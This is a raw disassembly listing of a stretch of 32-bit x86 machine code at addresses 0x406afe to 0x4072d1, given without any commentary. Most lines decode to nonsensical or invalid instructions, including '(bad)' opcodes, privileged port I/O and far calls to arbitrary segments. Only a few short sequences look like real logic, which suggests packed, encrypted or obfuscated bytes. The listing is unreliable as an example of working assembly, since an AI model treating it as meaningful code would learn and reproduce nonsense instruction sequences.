  406afe:	add    ch,0x39
  406b01:	sti    
  406b02:	rcr    edi,1
  406b04:	int3   
  406b05:	sbb    ebp,DWORD PTR es:[edx-0x3f78eb5d]
  406b0c:	xor    cl,BYTE PTR [esi-0x583bd2ba]
  406b12:	mov    BYTE PTR [edx+ebx*1],ah
  406b15:	stos   BYTE PTR es:[edi],al
  406b16:	int    0xc4
  406b18:	nop
  406b19:	xor    DWORD PTR [esi-0x28097494],ebx
  406b1f:	mov    al,0x4f
  406b21:	mov    cl,BYTE PTR [esi]
  406b23:	call   0xf521:0x735a21db
  406b2a:	pop    ss
  406b2b:	pop    es
  406b2c:	push   edi
  406b2d:	xchg   esp,eax
  406b2e:	or     DWORD PTR [eax-0x261f5914],ebp
  406b34:	clc    
  406b35:	add    bh,BYTE PTR [ecx+0x22]
  406b38:	test   eax,0xf1c268de
  406b3d:	xchg   ecx,edi
  406b3f:	mov    al,0x9d
  406b41:	mov    cl,0x8d
  406b43:	fdiv   DWORD PTR [edx+0x78d40939]
  406b49:	(bad)
  406b4e:	test   eax,0xc63f0ecd
  406b53:	cdq    
  406b54:	cmp    BYTE PTR [eax],ch
  406b56:	inc    eax
  406b57:	mov    ?,WORD PTR [ebp-0x446ee4c3]
  406b5d:	sub    BYTE PTR [esi],dh
  406b5f:	add    eax,DWORD PTR cs:[eax]
  406b62:	or     eax,0x56261321
  406b67:	cwde   
  406b68:	dec    eax
  406b69:	test   al,0x36
  406b6b:	ror    BYTE PTR [edi+0x2e],1
  406b6e:	push   edi
  406b6f:	and    BYTE PTR [ebx-0x33af630c],ch
  406b75:	xlat   BYTE PTR ds:[ebx]
  406b76:	mov    ah,0x75
  406b78:	data16 cmp al,0xb7
  406b7b:	adc    bl,BYTE PTR [ecx-0x60e0ec0d]
  406b81:	jno    0x406b74
  406b83:	mov    ebp,0x54527043
  406b88:	fsubr  QWORD PTR [edi+0x60358f9d]
  406b8e:	(bad)  [eax-0x215a4e49]
  406b94:	ja     0x406b4a
  406b96:	lods   eax,DWORD PTR ds:[esi]
  406b97:	fdiv   st,st(1)
  406b99:	push   ebx
  406b9a:	sub    edi,eax
  406b9c:	mov    ds:0xa2b5181a,al
  406ba1:	jp     0x406bc1
  406ba3:	dec    eax
  406ba4:	cld    
  406ba5:	test   al,0xaa
  406ba7:	xlat   BYTE PTR ds:[ebx]
  406ba8:	icebp  
  406ba9:	and    al,0xa0
  406bab:	shr    DWORD PTR [ecx+0x5bb29cf0],1
  406bb1:	push   es
  406bb2:	xor    DWORD PTR [ecx],0x4f
  406bb5:	adc    eax,0x558366ba
  406bba:	push   ebx
  406bbb:	test   DWORD PTR [edx],esp
  406bbd:	fs jns 0x406bf8
  406bc0:	int3   
  406bc1:	pusha  
  406bc2:	jge    0x406b74
  406bc4:	outs   dx,BYTE PTR ds:[esi]
  406bc5:	mov    ebp,0xda820e69
  406bca:	ja     0x406c45
  406bcc:	add    DWORD PTR [edx-0x13ccb7ef],ebp
  406bd2:	mov    eax,0x787be7c5
  406bd7:	out    dx,al
  406bd8:	mov    edx,0x9307dfbd
  406bdd:	fwait
  406bde:	push   esp
  406bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be0:	jp     0x406b71
  406be2:	mov    ch,0x30
  406be4:	mov    DWORD PTR [edx],edi
  406be6:	pop    ebx
  406be7:	loope  0x406b98
  406be9:	inc    ebp
  406bea:	jb     0x406c5d
  406bec:	enter  0x3815,0x9b
  406bf0:	retf   0x23b
  406bf3:	lds    eax,FWORD PTR [edx]
  406bf5:	and    al,0x69
  406bf7:	jns    0x406bf7
  406bf9:	pop    esp
  406bfa:	cmp    BYTE PTR cs:[ecx-0x42cecae7],dh
  406c01:	dec    ecx
  406c02:	push   0xe97b2e75
  406c07:	mov    DWORD PTR [eax+0x5f],ecx
  406c0a:	lods   eax,DWORD PTR ds:[esi]
  406c0b:	int3   
  406c0c:	jp     0x406be4
  406c0e:	pusha  
  406c0f:	push   0x26ed50a
  406c14:	or     al,0x6
  406c16:	inc    esp
  406c17:	loope  0x406c78
  406c19:	ss hlt 
  406c1b:	adc    eax,0xd25445c3
  406c20:	stos   DWORD PTR es:[edi],eax
  406c21:	lods   eax,DWORD PTR ds:[esi]
  406c22:	aaa    
  406c23:	sbb    DWORD PTR [eax-0x31ef279f],edi
  406c29:	xor    al,0x1f
  406c2b:	cs repnz mov esi,0x3220000
  406c32:	jnp    0x406c77
  406c34:	and    al,0x33
  406c36:	pop    es
  406c37:	add    al,0x3d
  406c39:	(bad)  
  406c3a:	fs dec esi
  406c3c:	sbb    edi,ebp
  406c3e:	mov    BYTE PTR [esi-0xb],0x35
  406c42:	dec    edx
  406c43:	jp     0x406c09
  406c45:	test   eax,0x9739de65
  406c4a:	sbb    al,0x6c
  406c4c:	mov    edi,0x23fabd9a
  406c51:	pop    esi
  406c52:	clc    
  406c53:	(bad)  
  406c55:	cmp    al,0x89
  406c57:	and    DWORD PTR [ecx-0x6c130ad6],ecx
  406c5d:	mov    DWORD PTR [ecx-0xf],esp
  406c60:	push   ebp
  406c61:	arpl   WORD PTR [eax],si
  406c63:	stc    
  406c64:	add    BYTE PTR [eax*2+0x7059bad4],bl
  406c6b:	gs pop edi
  406c6d:	push   eax
  406c6e:	test   eax,0xb69f2667
  406c73:	mov    DWORD PTR [ecx+0x34],edi
  406c76:	jo     0x406ca7
  406c78:	sub    ah,ch
  406c7a:	stos   DWORD PTR es:[edi],eax
  406c7b:	lods   eax,DWORD PTR ds:[esi]
  406c7c:	fst    DWORD PTR [eax+0x6ec06a3d]
  406c82:	xor    BYTE PTR [eax+0x5a4e9602],bl
  406c88:	dec    eax
  406c89:	pop    ds
  406c8a:	pop    esi
  406c8b:	add    esp,ebp
  406c8d:	xchg   esp,eax
  406c8e:	ins    BYTE PTR es:[edi],dx
  406c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c90:	mov    al,0x56
  406c92:	xchg   esi,eax
  406c93:	and    al,0xfb
  406c95:	out    0xda,al
  406c97:	dec    ebx
  406c98:	cmp    BYTE PTR [eax+ebp*4+0x6f662ecb],dl
  406c9f:	mov    al,0x48
  406ca1:	scas   al,BYTE PTR es:[edi]
  406ca2:	loopne 0x406cfa
  406ca4:	es pop eax
  406ca6:	sub    eax,0x6ac54210
  406cab:	xor    DWORD PTR [edx-0x70],esp
  406cae:	and    DWORD PTR [ecx],ecx
  406cb0:	mov    DWORD PTR [esi+0x50719ec7],0x95fa6d85
  406cba:	aaa    
  406cbb:	outs   dx,DWORD PTR ds:[esi]
  406cbc:	test   DWORD PTR [esi-0x2e9e2466],ebp
  406cc2:	es sti 
  406cc4:	add    DWORD PTR [ebx-0x62],ecx
  406cc7:	rol    BYTE PTR [edx+0x10],0xe3
  406ccb:	push   DWORD PTR [ebp-0xc]
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0x4e20d985
  406cf4:	push   esp
  406cf5:	mov    ebx,cs
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406cbb
  406cff:	mov    dl,0x6
  406d01:	or     esp,esi
  406d03:	inc    edi
  406d04:	sub    cl,cl
  406d06:	das    
  406d07:	push   cs
  406d08:	jmp    0x3bee2779
  406d0d:	or     eax,0x7dcbbc3c
  406d12:	int3   
  406d13:	xchg   esi,eax
  406d14:	out    dx,eax
  406d15:	sub    al,0x9b
  406d17:	add    DWORD PTR [edi+0x39ddd164],ebp
  406d1d:	inc    esp
  406d1e:	nop
  406d1f:	stc    
  406d20:	jl     0x406d52
  406d22:	(bad)  
  406d24:	inc    edi
  406d25:	add    al,0x7
  406d27:	data16 cmp BYTE PTR [edx-0x52],ah
  406d2b:	add    DWORD PTR [ebx+0x70],0x32ae043f
  406d32:	cmp    al,0xf9
  406d34:	bound  edi,QWORD PTR [ebp+0x5d]
  406d37:	enter  0x693e,0x9c
  406d3b:	and    eax,0x72968bd6
  406d40:	retf   0x2105
  406d43:	push   ebp
  406d44:	mov    gs,WORD PTR [eax+0x11]
  406d47:	jg     0x406d94
  406d49:	stos   BYTE PTR es:[edi],al
  406d4a:	xchg   ecx,eax
  406d4b:	aaa    
  406d4c:	pop    ecx
  406d4d:	inc    ecx
  406d4e:	stc    
  406d4f:	adc    dl,BYTE PTR [edx-0x3b]
  406d52:	es cmp al,0xe9
  406d55:	inc    esp
  406d56:	fdiv   DWORD PTR [ebx+0x7a4950e7]
  406d5c:	imul   ebx,DWORD PTR [edi],0x1ea3f2a9
  406d62:	mov    dl,0xc6
  406d64:	pop    eax
  406d65:	inc    esi
  406d66:	push   edx
  406d67:	inc    edx
  406d68:	jl     0x406dbc
  406d6a:	cwde   
  406d6b:	jge    0x406d4e
  406d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d6f:	pop    ebx
  406d70:	dec    esi
  406d71:	sub    DWORD PTR [ebx+0xe],0x279543a6
  406d78:	fwait
  406d79:	sub    ebx,DWORD PTR [esi]
  406d7b:	int3   
  406d7c:	lods   al,BYTE PTR ds:[esi]
  406d7d:	mov    eax,0xc7a93620
  406d82:	xchg   al,ah
  406d84:	xchg   ebp,eax
  406d85:	mov    esi,0x1b27ff3f
  406d8a:	or     DWORD PTR [ecx+0x77],0xa5dda67d
  406d91:	jbe    0x406de1
  406d93:	adc    al,0x89
  406d95:	add    al,0x91
  406d97:	hlt    
  406d98:	or     ebx,esi
  406d9a:	sbb    al,0xd5
  406d9c:	inc    eax
  406d9d:	xchg   ebx,eax
  406d9e:	ins    DWORD PTR es:[edi],dx
  406d9f:	mov    esi,0xbe4c8350
  406da4:	and    DWORD PTR [edx+0x4ffe9ae9],ebx
  406daa:	sbb    eax,0xdcf59d6d
  406daf:	lods   al,BYTE PTR ds:[esi]
  406db0:	inc    edx
  406db1:	data16 test BYTE PTR [ecx+0x2f],0xe8
  406db6:	xor    dh,al
  406db8:	pop    edx
  406db9:	jle    0x406d94
  406dbb:	sub    al,BYTE PTR [ebp-0x5b972c01]
  406dc1:	inc    esp
  406dc2:	mov    gs,WORD PTR [ecx+0x1d]
  406dc5:	mov    dl,0xc7
  406dc7:	sub    bl,ch
  406dc9:	test   DWORD PTR [esp+eiz*2+0x13],ebp
  406dcd:	std    
  406dce:	mov    edx,0x8a451313
  406dd3:	push   ebx
  406dd4:	mov    ecx,0x16d92241
  406dd9:	aad    0x2
  406ddb:	ds leave 
  406ddd:	cmp    DWORD PTR [edi-0x65],0xffffffbf
  406de1:	sbb    al,0xc1
  406de3:	js     0x406d87
  406de5:	jle    0x406e5c
  406de7:	sub    ah,BYTE PTR [edx+eiz*2+0x4f]
  406deb:	mov    eax,0x96c814a3
  406df0:	or     al,0x8e
  406df2:	dec    edx
  406df3:	xor    eax,0x42b460e4
  406df8:	pop    es
  406df9:	xchg   esp,eax
  406dfa:	sbb    eax,0x3195796f
  406dff:	mov    WORD PTR [eax+0x5c0d5d56],fs
  406e05:	mov    ds:0xbc307725,eax
  406e0a:	(bad)  
  406e0b:	sub    al,0x98
  406e0d:	xor    esi,DWORD PTR [esi-0xc]
  406e10:	imul   esi,DWORD PTR ds:0xc27066f2,0x94b8c68f
  406e1a:	add    DWORD PTR [ecx],ebx
  406e1c:	daa    
  406e1d:	jnp    0x406e54
  406e1f:	ja     0x406dfa
  406e21:	xchg   edx,eax
  406e22:	pop    ebx
  406e23:	sbb    DWORD PTR [eax+ebp*2-0x15],edx
  406e27:	mov    edi,0x7ba92382
  406e2c:	add    al,0xa4
  406e2e:	jl     0x406e05
  406e30:	push   ecx
  406e31:	mov    ch,0x4e
  406e33:	scas   eax,DWORD PTR es:[edi]
  406e34:	inc    ebp
  406e35:	rcl    DWORD PTR [ecx],1
  406e37:	mov    DWORD PTR [edx-0x16c37b14],edi
  406e3d:	call   0x535db22e
  406e42:	iret   
  406e43:	and    bh,bl
  406e45:	lea    ecx,[edi+0x3a]
  406e48:	xchg   esp,eax
  406e49:	add    ah,BYTE PTR [edx]
  406e4b:	push   esp
  406e4c:	mov    dl,0xb9
  406e4e:	out    0x15,al
  406e50:	jge    0x406dd5
  406e52:	inc    ebx
  406e53:	fadd   DWORD PTR [esi+0x7c58566d]
  406e59:	iret   
  406e5a:	mov    edi,0x383e583a
  406e5f:	fsub   QWORD PTR [esi]
  406e61:	pop    ss
  406e62:	xchg   esi,eax
  406e63:	cmp    ch,BYTE PTR [edx]
  406e65:	enter  0xee1e,0x1
  406e69:	(bad)  
  406e6a:	mov    esi,0x2b9ab19b
  406e6f:	mov    cl,0xef
  406e71:	mov    ds:0x30101ea,eax
  406e76:	mov    cl,ah
  406e78:	inc    eax
  406e79:	mov    dl,0xdc
  406e7b:	mov    edx,DWORD PTR [esi+edi*1-0x7]
  406e7f:	sbb    eax,0xebd34af0
  406e84:	arpl   WORD PTR [esi],si
  406e86:	pusha  
  406e87:	mov    edx,ss
  406e89:	test   eax,0x9192f733
  406e8e:	jno    0x406e2d
  406e90:	jg     0x406f04
  406e92:	stc    
  406e93:	call   0x61a4:0x253692f1
  406e9a:	sub    cl,BYTE PTR [edi-0x5f4b67a5]
  406ea0:	nop
  406ea1:	cmp    ebx,ecx
  406ea3:	mov    ds:0x3be56cfa,al
  406ea8:	es cmp al,0xe3
  406eab:	sbb    BYTE PTR ds:0x4c214da2,bh
  406eb1:	jb     0x406e7c
  406eb3:	outs   dx,BYTE PTR ds:[esi]
  406eb4:	jbe    0x406e70
  406eb6:	ret    0x9b66
  406eb9:	mov    cl,0xb1
  406ebb:	or     BYTE PTR [eax],dh
  406ebd:	inc    esp
  406ebe:	push   ds
  406ebf:	stc    
  406ec0:	std    
  406ec1:	jg     0x406f2a
  406ec3:	mov    DWORD PTR [esi+0x62],0xb8df75bd
  406eca:	lods   eax,DWORD PTR ds:[esi]
  406ecb:	jo     0x406f48
  406ecd:	xor    ecx,edi
  406ecf:	mov    esi,0xa62a33f7
  406ed4:	jo     0x406f05
  406ed6:	repnz fwait
  406ed8:	retf   
  406ed9:	jae    0x406f32
  406edb:	adc    DWORD PTR [ebx-0x464a53fc],0x726d886a
  406ee5:	bnd jmp 0x456188c6
  406eeb:	pushf  
  406eec:	sbb    bh,bl
  406eee:	js     0x406e87
  406ef0:	cs retf 
  406ef2:	loope  0x406f57
  406ef4:	pop    esi
  406ef5:	inc    edx
  406ef6:	sub    BYTE PTR [ebx-0x45],ch
  406ef9:	mul    DWORD PTR [ebp+0x13]
  406efc:	ret    0x693
  406eff:	xchg   DWORD PTR [esp+ebp*2],edx
  406f02:	add    ah,BYTE PTR [eax]
  406f04:	pop    ss
  406f05:	in     ax,dx
  406f07:	push   edi
  406f08:	adc    al,0x8c
  406f0a:	adc    ch,BYTE PTR [edi+0x6d99da15]
  406f10:	scas   al,BYTE PTR es:[edi]
  406f11:	sub    eax,0x360bd49b
  406f16:	pop    ss
  406f17:	scas   eax,DWORD PTR es:[edi]
  406f18:	hlt    
  406f19:	ins    BYTE PTR es:[edi],dx
  406f1a:	mov    al,0x99
  406f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f1d:	fsub   DWORD PTR [edx-0x56]
  406f20:	xchg   ecx,eax
  406f21:	imul   ebp,DWORD PTR [eax],0x696a180
  406f27:	aam    0x66
  406f29:	sub    DWORD PTR [ebp+eiz*8-0x5e],esp
  406f2d:	ret    
  406f2e:	leave  
  406f2f:	xor    al,0x10
  406f31:	imul   ebx,DWORD PTR [ecx],0x414cdbe6
  406f37:	fistp  DWORD PTR [ebp-0x43]
  406f3a:	mov    fs,WORD PTR [edi+0x5be9a551]
  406f40:	inc    eax
  406f41:	mov    ecx,?
  406f43:	cs ja  0x406f01
  406f46:	rcl    DWORD PTR [ebp-0x60],1
  406f49:	mov    bl,0x1a
  406f4b:	mov    bl,0x2a
  406f4d:	and    bh,dh
  406f4f:	call   0xf62:0xbc8c7338
  406f56:	mov    edx,0xf22541b1
  406f5b:	jmp    0x406f86
  406f5d:	outs   dx,BYTE PTR ds:[esi]
  406f5e:	adc    dl,BYTE PTR [ebp-0x80]
  406f61:	push   eax
  406f62:	test   eax,0x4e2ae6b
  406f67:	xchg   esi,eax
  406f68:	mov    ch,0x54
  406f6a:	and    eax,0x14249ccf
  406f6f:	stc    
  406f70:	jns    0x406fa7
  406f72:	pop    edx
  406f73:	dec    esp
  406f74:	or     DWORD PTR [ebp+0x4],edi
  406f77:	jae    0x406f40
  406f79:	push   ss
  406f7a:	jne    0x406f96
  406f7c:	gs add eax,0x19018168
  406f82:	mov    ch,0x89
  406f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f85:	cld    
  406f86:	jns    0x406f4c
  406f88:	(bad)  
  406f89:	int    0x57
  406f8b:	outs   dx,DWORD PTR ds:[esi]
  406f8c:	and    BYTE PTR [ebx+0x474b0fcc],0x5c
  406f93:	inc    esp
  406f94:	and    al,0xce
  406f96:	int3   
  406f97:	inc    ebp
  406f98:	mov    cs,eax
  406f9a:	in     eax,dx
  406f9b:	mov    ds:0x749b2a87,al
  406fa0:	add    ebx,DWORD PTR [eax]
  406fa2:	out    0xf3,eax
  406fa4:	push   ss
  406fa5:	dec    esi
  406fa6:	dec    eax
  406fa7:	and    DWORD PTR [eax-0x2cfb29ad],esp
  406fad:	pushf  
  406fae:	mov    eax,0xa47b2d00
  406fb3:	dec    edx
  406fb4:	or     DWORD PTR [ebp+0x3a478ed7],esi
  406fba:	addr16 mov ebp,0xa2304cbf
  406fc0:	adc    DWORD PTR [ebx+ecx*2+0x30],ecx
  406fc4:	mov    al,0xbc
  406fc6:	pusha  
  406fc7:	fld    DWORD PTR [bx+si]
  406fca:	cli    
  406fcb:	add    al,0xaa
  406fcd:	pop    ebp
  406fce:	imul   ebp,DWORD PTR [edi+0xf],0xffffffa7
  406fd2:	bound  ebp,QWORD PTR [ecx+0x59]
  406fd5:	test   al,0x42
  406fd7:	pop    ecx
  406fd8:	or     DWORD PTR [esi-0x5a],ebx
  406fdb:	jecxz  0x406f9f
  406fdd:	clc    
  406fde:	push   esp
  406fdf:	pop    esi
  406fe0:	sbb    esp,DWORD PTR [edi+0x41]
  406fe3:	xchg   DWORD PTR [ebp-0x156fa4fd],ebp
  406fe9:	div    BYTE PTR [edx+0x68]
  406fec:	xor    eax,0xd18c9a24
  406ff1:	icebp  
  406ff2:	cmp    BYTE PTR [edx],ah
  406ff4:	popa   
  406ff5:	das    
  406ff6:	aad    0x2f
  406ff8:	xchg   esp,eax
  406ff9:	fcomp  QWORD PTR [edi-0x55]
  406ffc:	push   0xfffffff9
  406ffe:	popf   
  406fff:	adc    eax,0x18401724
  407004:	hlt    
  407005:	inc    eax
  407006:	push   0xffffffe2
  407008:	xchg   ebp,eax
  407009:	mov    ah,ch
  40700b:	getsec 
  40700d:	jns    0x406fc7
  40700f:	xor    ebx,edx
  407011:	mov    edi,0xdb352057
  407016:	mov    DWORD PTR [ecx],esi
  407018:	jbe    0x406fb2
  40701a:	jge    0x40704d
  40701c:	jmp    0xe6209dfc
  407021:	cld    
  407022:	jne    0x407032
  407024:	mov    bh,0xc1
  407026:	je     0x407080
  407028:	mov    fs,ecx
  40702a:	inc    ebp
  40702b:	aad    0x40
  40702d:	inc    edx
  40702e:	push   eax
  40702f:	mov    eax,DWORD PTR [ebp-0x14]
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x9b21d6c8
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x4070d4
  407061:	mov    BYTE PTR [ebx-0x51cc2de3],cl
  407067:	lock cmp esp,DWORD PTR ds:0x97c840f0
  40706e:	dec    edx
  40706f:	fucomi st,st(2)
  407071:	daa    
  407072:	push   edx
  407073:	in     eax,0x6c
  407075:	in     eax,dx
  407076:	sbb    BYTE PTR [ecx+0x42acdd71],bl
  40707c:	fisttp QWORD PTR [eax+0x35]
  40707f:	and    esp,DWORD PTR [edi+eax*4-0xc]
  407083:	mov    bl,0x23
  407085:	sbb    DWORD PTR [esi-0x12],eax
  407088:	test   BYTE PTR ds:[ebx+edi*8],dl
  40708c:	mov    BYTE PTR [ecx+0x1506c4ae],cl
  407092:	and    bl,ch
  407094:	loopne 0x4070c4
  407096:	(bad)  
  407097:	shr    DWORD PTR [ecx],1
  407099:	mov    ds:0x25ca1f56,eax
  40709e:	mov    BYTE PTR [ecx+0x1b],ah
  4070a1:	or     esi,DWORD PTR [ebp-0x3c88f954]
  4070a7:	fisttp WORD PTR [edx-0x4c]
  4070aa:	cmp    edi,DWORD PTR [esi-0x6dbeac51]
  4070b0:	jecxz  0x407131
  4070b2:	inc    ebx
  4070b3:	adc    DWORD PTR [esp+eax*1+0x1],edi
  4070b7:	or     eax,0xe715c511
  4070bc:	retf   0xc053
  4070bf:	fdiv   st,st(0)
  4070c1:	push   0xb88ae0bf
  4070c6:	mov    ebp,DWORD PTR [ebp+0x42c5c963]
  4070cc:	mov    dh,0xc
  4070ce:	test   DWORD PTR [ecx-0x49],edx
  4070d1:	sub    DWORD PTR [edi+0x6a015294],esi
  4070d7:	mov    esp,0x4d1e442
  4070dc:	pop    ebx
  4070dd:	add    al,0x11
  4070df:	fist   DWORD PTR [ecx]
  4070e1:	aaa    
  4070e2:	in     al,0x17
  4070e4:	mov    bl,0x30
  4070e6:	xor    dl,BYTE PTR [edi-0x19]
  4070e9:	jb     0x40706c
  4070eb:	retf   
  4070ec:	mov    ?,esp
  4070ee:	adc    al,BYTE PTR [ebp-0x2548a0a6]
  4070f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f5:	xchg   esi,eax
  4070f6:	sub    dl,BYTE PTR ds:0x72dc533b
  4070fc:	mov    ds:0xa72f921d,al
  407101:	ss and al,0x81
  407104:	add    al,0xa5
  407106:	add    eax,0x90caf798
  40710b:	inc    ebx
  40710c:	inc    ebp
  40710d:	mov    ds:0x6090a08d,al
  407112:	push   edx
  407113:	imul   edi,DWORD PTR [edx-0x7c8c519e],0x4d
  40711a:	push   edi
  40711b:	shr    DWORD PTR [ebp+0x77],1
  40711e:	pop    esp
  40711f:	xchg   DWORD PTR [edi-0x7feec5ab],ebp
  407125:	dec    edi
  407126:	addr16 or al,0x1a
  407129:	loop   0x407115
  40712b:	loopne 0x407148
  40712d:	mov    cl,0xea
  40712f:	add    BYTE PTR [esi+0x59],ah
  407132:	imul   eax,eax,0x3494295c
  407138:	pop    ds
  407139:	mov    ebx,0x58224d4a
  40713e:	lods   al,BYTE PTR gs:[esi]
  407140:	outs   dx,DWORD PTR ds:[esi]
  407141:	jg     0x4070d0
  407143:	outs   dx,BYTE PTR ds:[esi]
  407144:	clc    
  407145:	jmp    0xac5576a8
  40714a:	xor    edi,ebp
  40714c:	xchg   si,ax
  40714e:	ret    
  40714f:	pop    ecx
  407150:	fldcw  WORD PTR [eax+0x0]
  407153:	push   eax
  407154:	dec    ebp
  407155:	das    
  407156:	inc    edx
  407157:	pop    esi
  407158:	cmp    BYTE PTR [eax+eiz*1],0x64
  40715c:	pop    ebx
  40715d:	cmp    al,0x27
  40715f:	xchg   DWORD PTR [eax+edx*4],esi
  407162:	pop    ds
  407163:	jnp    0x40715b
  407165:	je     0x40719c
  407167:	jo     0x407197
  407169:	xchg   esp,eax
  40716a:	mov    edx,0xe845b1cc
  40716f:	out    dx,eax
  407170:	stc    
  407171:	cmp    al,0x19
  407173:	aam    0x70
  407175:	pushf  
  407176:	xchg   ebp,eax
  407177:	hlt    
  407178:	sar    ah,1
  40717a:	cmc    
  40717b:	dec    ecx
  40717c:	mov    ch,0x5e
  40717e:	mov    ebp,DWORD PTR [eax-0x74]
  407181:	imul   ebp,DWORD PTR [ecx+0x68],0xffffffc2
  407185:	pop    edx
  407186:	dec    ebp
  407187:	sbb    al,0x7
  407189:	mov    DWORD PTR [edi+edi*2],edx
  40718c:	inc    ecx
  40718d:	dec    ecx
  40718e:	xor    al,0x16
  407190:	jl     0x407141
  407192:	adc    al,0x59
  407194:	mov    ah,0xfa
  407196:	mov    bl,0x81
  407198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407199:	inc    esi
  40719a:	xchg   esp,eax
  40719b:	adc    edx,DWORD PTR [esi+0x2c597c30]
  4071a1:	sahf   
  4071a2:	bt     DWORD PTR [esi-0x7d63e732],edx
  4071a9:	cld    
  4071aa:	jno    0x4071bc
  4071ac:	inc    ecx
  4071ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071ae:	mov    eax,ds:0x6b26992b
  4071b3:	and    DWORD PTR [esi+0x70],edx
  4071b6:	hlt    
  4071b7:	cmp    esp,ecx
  4071b9:	mov    eax,DWORD PTR [ecx+0x2d]
  4071bc:	(bad)
  4071c0:	fld    TBYTE PTR [ecx-0x68]
  4071c3:	sti    
  4071c4:	(bad)  
  4071c5:	push   edx
  4071c6:	jne    0x40721b
  4071c8:	imul   edi,DWORD PTR [edi+eiz*2],0xfffffff5
  4071cc:	jmp    0xc0b477e0
  4071d1:	fwait
  4071d2:	pop    ds
  4071d3:	aas    
  4071d4:	retf   0x820a
  4071d7:	xor    eax,DWORD PTR [ebp+0x34]
  4071da:	test   DWORD PTR [edi],ebx
  4071dc:	pop    es
  4071dd:	enter  0x10e,0x86
  4071e1:	pop    esi
  4071e2:	xor    eax,0x2d76e9b9
  4071e7:	scas   al,BYTE PTR es:[edi]
  4071e8:	les    edx,FWORD PTR [edi]
  4071ea:	pop    ss
  4071eb:	mov    eax,ds:0xc6af7efd
  4071f0:	mov    esi,DWORD PTR [edx+0x71]
  4071f3:	(bad)  [esi+0x79687b6d]
  4071f9:	ja     0x407275
  4071fb:	fisubr DWORD PTR [esi]
  4071fd:	sub    BYTE PTR [eax-0x5e2f38cd],dh
  407203:	dec    esp
  407204:	pop    edi
  407205:	lea    ebp,[esi-0x35]
  407208:	cld    
  407209:	xchg   ebx,eax
  40720a:	dec    ebx
  40720b:	xor    ch,0x98
  40720e:	adc    BYTE PTR [eax],ah
  407210:	jmp    0x407221
  407212:	push   ebp
  407213:	mov    BYTE PTR [eax-0x23eb68e5],bl
  407219:	mov    ebx,0x27bdae42
  40721e:	push   edx
  40721f:	cli    
  407220:	push   ebp
  407221:	fs mov esi,0x2b4aa6a7
  407227:	dec    edx
  407228:	jbe    0x407295
  40722a:	neg    BYTE PTR [ecx+0x1190d9d8]
  407230:	call   0xbcdf8d81
  407235:	inc    ecx
  407236:	div    DWORD PTR [eax+ebp*2]
  407239:	ret    
  40723a:	fistp  QWORD PTR [esi+0x53]
  40723d:	aas    
  40723e:	adc    bl,BYTE PTR [eax-0x1e]
  407241:	cmp    al,0x54
  407243:	mov    ecx,0x90866934
  407248:	fincstp 
  40724a:	or     al,BYTE PTR [ebx-0x4d52ed72]
  407250:	xor    ecx,0xffffffa5
  407253:	mov    al,ds:0xcd53261e
  407258:	test   al,0xb8
  40725a:	pop    ss
  40725b:	push   cs
  40725c:	mov    dh,BYTE PTR [ebx-0x56d11d29]
  407262:	daa    
  407263:	pop    ebp
  407264:	inc    esi
  407265:	gs stc 
  407267:	adc    al,ch
  407269:	pop    esi
  40726a:	xchg   ebp,eax
  40726b:	mov    al,0x4b
  40726d:	adc    al,0x72
  40726f:	xchg   esp,eax
  407270:	xor    bh,BYTE PTR [ebx+0x3a]
  407273:	enter  0xa077,0x5f
  407277:	les    ebp,FWORD PTR [edi+0x50d5c8de]
  40727d:	xor    eax,0x47e2a5a8
  407282:	pop    edx
  407283:	call   0x634f7595
  407288:	jo     0x40727c
  40728a:	inc    esi
  40728b:	push   edi
  40728c:	mov    eax,0x53e47551
  407291:	pop    ebx
  407292:	inc    esi
  407293:	jbe    0x407227
  407295:	fbstp  TBYTE PTR [edi]
  407297:	lahf   
  407298:	dec    ebx
  407299:	hlt    
  40729a:	add    dl,BYTE PTR [ecx-0x121814dd]
  4072a0:	jae    0x40726b
  4072a2:	jno    0x4072d2
  4072a4:	mov    WORD PTR [edx-0x79],fs
  4072a7:	dec    edi
  4072a8:	imul   edi,DWORD PTR [edx],0x73
  4072ab:	std    
  4072ac:	(bad)  
  4072ad:	jle    0x4072cf
  4072af:	push   edx
  4072b0:	cmp    al,0x13
  4072b2:	repnz push edi
  4072b4:	ins    BYTE PTR es:[edi],dx
  4072b5:	dec    ecx
  4072b6:	push   ds
  4072b7:	stc    
  4072b8:	int    0xf4
  4072ba:	repnz pusha 
  4072bc:	icebp  
  4072bd:	adc    cl,BYTE PTR [esp+edx*1+0x78]
  4072c1:	jmp    0x9a9e:0xe3a08971
  4072c8:	or     al,0x60
  4072ca:	sar    BYTE PTR [eax+0x5c],0x97
  4072ce:	dec    esi
  4072cf:	ins    BYTE PTR es:[edi],dx
  4072d0:	scas   al,BYTE PTR es:[edi]
  4072d1:	mov    esi,0x9007d9eb
